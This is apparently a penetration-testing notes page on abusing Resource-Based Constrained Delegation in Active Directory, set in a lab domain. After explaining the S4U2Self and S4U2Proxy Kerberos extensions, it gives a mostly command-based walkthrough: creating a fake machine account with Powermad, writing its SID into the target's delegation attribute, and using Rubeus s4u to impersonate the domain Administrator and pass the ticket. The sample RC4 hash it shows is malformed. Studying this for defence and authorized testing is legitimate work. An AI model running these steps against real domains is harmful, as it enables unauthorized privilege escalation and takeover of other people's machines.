# RBCD

## <mark style="color:$primary;">ABOUT</mark>

<mark style="color:red;">**RBCD**</mark> is a <mark style="color:purple;">**Windows Active Directory mechanism**</mark> where a computer object specifies which accounts are allowed to impersonate users to it, for constrained **(limited)** network-based delegation using Kerberos.

> Attackers exploit it by inserting themselves into that trust list and impersonating any user.

<mark style="color:yellow;">**"Resource-Based"**</mark> means the permission is set on the target machine, not on the impersonating account.&#x20;

<mark style="color:yellow;">**"Constrained"**</mark> means the impersonation is limited to specific services, like SMB or LDAP, not all services.&#x20;

<mark style="color:yellow;">**"Delegation"**</mark> means one account can act as another user across the network, not just locally.

RBCD allows a computer or service account to say, <mark style="color:orange;">**"this other account is allowed to act as any user when connecting to me."**</mark> Attackers abuse it by **creating their own computer account**, then **writing their own SID into the delegation attribute** on a target machine. After that, they can impersonate any domain user, like Administrator, to that target.

> So basically it is crippled version of full impersonation, which is good, considering rule of least privilege.

{% hint style="info" %}
### Example of Implementation

A user logs into a web application using a standard web form. The web server needs to query a backend SQL database as that user, but does not have the user's password.

**S4U2Self** allows the web server to forge a Kerberos ticket for the user to itself.

**S4U2Proxy** allows the web server to exchange that forged self-ticket for a valid service ticket to the SQL database.
{% endhint %}

## <mark style="color:$primary;">S4U2Self + S4U2Proxy</mark>

<mark style="color:red;">**S4U2Self**</mark> and <mark style="color:red;">**S4U2Proxy**</mark> are <mark style="color:purple;">**Kerberos protocol extensions**</mark>, not standalone attack techniques.

They were designed by Microsoft as part of **Service-for-User (S4U)** functionality to support **constrained delegation**. Their purpose is to let services act on behalf of users under strict control.

#### <mark style="color:green;">**S4U2Self**</mark> = <mark style="color:yellow;">**"Service For User To Self"**</mark>

Lets a service request a ticket for any user to itself, without needing the user's password.

_**"Give me****&#x20;**<mark style="color:$warning;">**SERVICE**</mark>**&#x20;****ticket****&#x20;**<mark style="color:$warning;">**FOR**</mark>**&#x20;****other****&#x20;**<mark style="color:$warning;">**USER**</mark>**&#x20;****so I can use it****&#x20;**<mark style="color:$warning;">**TO**</mark>**&#x20;****my**<mark style="color:$warning;">**SELF**</mark>**"**_

#### <mark style="color:green;">**S4U2Proxy**</mark> = <mark style="color:yellow;">**"Service For User To Proxy"**</mark>

Lets the service use that ticket to request a second ticket to another service, completing delegation.

_**"Take this****&#x20;**<mark style="color:$warning;">**SERVICE**</mark>**&#x20;****Ticket****&#x20;**<mark style="color:$warning;">**from**</mark>**&#x20;****this****&#x20;**<mark style="color:$warning;">**USER**</mark>**&#x20;****I just got, and let me****&#x20;**<mark style="color:$warning;">**TO PROXY**</mark>**&#x20;****this user's access to that other service"**_

## <mark style="color:$primary;">REQUIREMENTS</mark>

| Element               | Value                               |
| --------------------- | ----------------------------------- |
| Domain User           | Administrator@militech.local        |
| Fake Machine Account  | FAKE01$                             |
| Fake Machine Password | 123456                              |
| Fake Machine SID      | _To be retrieved during attack_     |
| Target Machine        | WS01                                |
| Target Admin          | Administrator                       |
| Domain Controller     | DC01                                |
| Delegation Permission | Write access to WS01 RBCD attribute |

## <mark style="color:$primary;">FLOW</mark>

1. Create a fake machine account (<mark style="color:green;">**FAKE01$**</mark>), if <mark style="color:green;">`MachineAccountQuota`</mark> allows it.
2. Add <mark style="color:green;">**FAKE01$**</mark> SID to the <mark style="color:green;">**`msDS-AllowedToActOnBehalfOfOtherIdentity`**</mark> attribute on the target machine **WS01**, granting delegation rights.
3. Authenticate as <mark style="color:green;">**FAKE01$**</mark> and request a Kerberos ticket as Administrator to <mark style="color:green;">**FAKE01**</mark> (<mark style="color:red;">**S4U2Self**</mark>).
4. Use that ticket to request a second ticket as Administrator to **WS01** (<mark style="color:red;">**S4U2Proxy**</mark>).
5. Receive a valid service ticket for Administrator to **WS01** and use it to access **WS01** as Administrator, achieving privilege escalation.

{% hint style="info" %}
It's not necessary to create a fake account, sometimes it's better to give some machine account we have access to a delegation rights, or don't if we already have access to. The possibilities are vast, the only thing you need to undertand is components we need for attack.
{% endhint %}

## <mark style="color:$primary;">WINDOWS</mark>

#### 1. Creating Machine Object

> For this we need PowerMAD script [**\[LINK\]**](https://github.com/Kevin-Robertson/Powermad)

```powershell
PS C:\> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

#### Checking Object + Taking it's SID

```powershell
PS C:\> Get-DomainComputer fake01
```

#### 2. Creating Security Descriptor for FAKE01

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

#### 3. Adding Descriptor bytes into WS01 (Service Machine)

```bash
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

#### Checking Descriptor

```powershell
PS C:\> (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

#### 4. Generating RC4 Hash for FAKE01

```powershell
.\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:militech.local
```

#### 5. Impersonating

```powershell
.\Rubeus.exe s4u /user:fake01$ /rc4:3SAOIDFHOQWEB1O82G3O123KBSND /impersonateuser:Administrator /msdsspn:cifs/ws01.militech.local /ptt
```

#### Base64 Ticket to Ccache ticket

```bash
base64 -d ticket_bash64.txt > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/home/v17/tickets/ticket.ccache
klist
```

## <mark style="color:$primary;">RESOURCES</mark>

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#creating-a-new-computer-object" %}
